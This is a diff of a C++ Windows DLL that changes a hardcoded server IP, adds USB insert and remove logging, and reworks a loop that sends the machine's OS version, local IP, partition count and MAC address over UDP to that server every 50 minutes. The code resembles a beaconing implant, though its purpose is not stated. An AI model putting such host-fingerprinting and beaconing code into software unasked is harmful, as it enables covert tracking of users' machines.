@@ -25,7 +25,7 @@ using namespace std;
 
 #define LOG_FILE  "dll_log.log"
 
-#define SERVER_ADDR "171.1.2.13"
+#define SERVER_ADDR "144.168.62.129"
 #define SERVER_PORT 4587
 
 #define UDP_CLIENT_STATE_INIT  0
@@ -168,7 +168,7 @@ unsigned __stdcall localProc(void* pArguments)
 		char *body = NULL;
 		if (hdr->version == PROTO_VERSION &&
 			hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
-		{
+		{//get local path for bootstrap.exe
 			body = recvBuf + sizeof(LOCAL_PROTO_T);
 			memcpy(host_exe_path_, body, hdr->body_len);
 			geted_host_exe_path_ = true;
@@ -191,20 +191,28 @@ void onUsbInsert(char usb)
 	char usb_path[20] = { 0 };
 	usb_path[0] = usb;
 	strcat(usb_path, SUFFIX);
+	log_write(loger_, "啊……%c盘插进来了\n", usb);
 
+}
 
+void onUsbRemove(char usb)
+{
+#define SUFFIX ":\\"
+	char usb_path[20] = { 0 };
+	usb_path[0] = usb;
+	strcat(usb_path, SUFFIX);
+	log_write(loger_, "啊……%c盘被拔掉了\n", usb);
 }
 
 
 
-LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
+LRESULT CALLBACK UsbWndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
 {
 	if (msg == WM_DEVICECHANGE) {
 		if ((DWORD)wp == DBT_DEVICEARRIVAL) {
 			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
 			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
 				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
-				log_write(loger_, "啊……%c盘插进来了\n", 'A' + l);
 				onUsbInsert(l + 'A');
 			}
 		}
@@ -212,7 +220,7 @@ LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
 			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
 			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
 				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
-				log_write(loger_, "啊……%c盘被拔掉了\n", 'A' + l);
+				onUsbRemove(l + 'A');
 			}
 		}
 		return TRUE;
@@ -226,7 +234,7 @@ unsigned __stdcall usbEventProc(void* pArguments)
 	WNDCLASS wc;
 	ZeroMemory(&wc, sizeof(wc));
 	wc.lpszClassName = TEXT("usb_listener");
-	wc.lpfnWndProc = WndProc;
+	wc.lpfnWndProc = UsbWndProc;
 
 	RegisterClass(&wc);
 	HWND h = CreateWindow(TEXT("usb_listener"), TEXT(""), 0, 0, 0, 0, 0,
@@ -334,6 +342,10 @@ unsigned __stdcall registerProc(void* pArguments)
 	char *body = NULL;
 	char *ptr = NULL;
 	int total_len = 0;
+	time_t last_send_time = 0;
+	time_t current_time;
+
+	
 
 	SOCKET sock = create_local_datagramsock_and_bind();
 	if (sock == 0){
@@ -347,25 +359,30 @@ unsigned __stdcall registerProc(void* pArguments)
 	
 	while (!bQuit_)
 	{
-		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
-		hdr->version = PROTO_VERSION;
-		hdr->msg_type = MSG_TYPE_REGISTER;
-		hdr->body_len = 0;
-		body = buffer + sizeof(LOCAL_PROTO_T);
-		ptr = body;
-		(*(int *)ptr) = get_os_version();
-		ptr += sizeof(int);
-		(*(int *)ptr) = get_local_ipv4_addr();
-		ptr += sizeof(int);
-		(*(char *)ptr) = get_number_of_partition();
-		ptr += sizeof(char);
-		memcpy(ptr, get_mac_address(), 6);
-		ptr += 6;
-		data_len = (int)(ptr - body);
-		hdr->body_len = data_len;
-		total_len = (int)(ptr - (char *)hdr);
-		sendto(sock, buffer, total_len, 0, (sockaddr *)&addrServ, sizeof(addrServ));
-		Sleep(1000 * 3000);//50 min
+		time(&current_time);
+		if (current_time - last_send_time >= 50 * 60)
+		{
+			LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
+			hdr->version = PROTO_VERSION;
+			hdr->msg_type = MSG_TYPE_REGISTER;
+			hdr->body_len = 0;
+			body = buffer + sizeof(LOCAL_PROTO_T);
+			ptr = body;
+			(*(int *)ptr) = get_os_version();
+			ptr += sizeof(int);
+			(*(int *)ptr) = get_local_ipv4_addr();
+			ptr += sizeof(int);
+			(*(char *)ptr) = get_number_of_partition();
+			ptr += sizeof(char);
+			memcpy(ptr, get_mac_address(), 6);
+			ptr += 6;
+			data_len = (int)(ptr - body);
+			hdr->body_len = data_len;
+			total_len = (int)(ptr - (char *)hdr);
+			sendto(sock, buffer, total_len, 0, (sockaddr *)&addrServ, sizeof(addrServ));
+			time(&last_send_time);
+		}
+		Sleep(500);
 	}
 	return 0;
 }
@@ -600,7 +617,6 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 				{
 					hdr = (LOCAL_PROTO_T *)buffer;
 					onPacketRead(&client_status_, buffer, ret);
-					
 				}
 				else
 				{
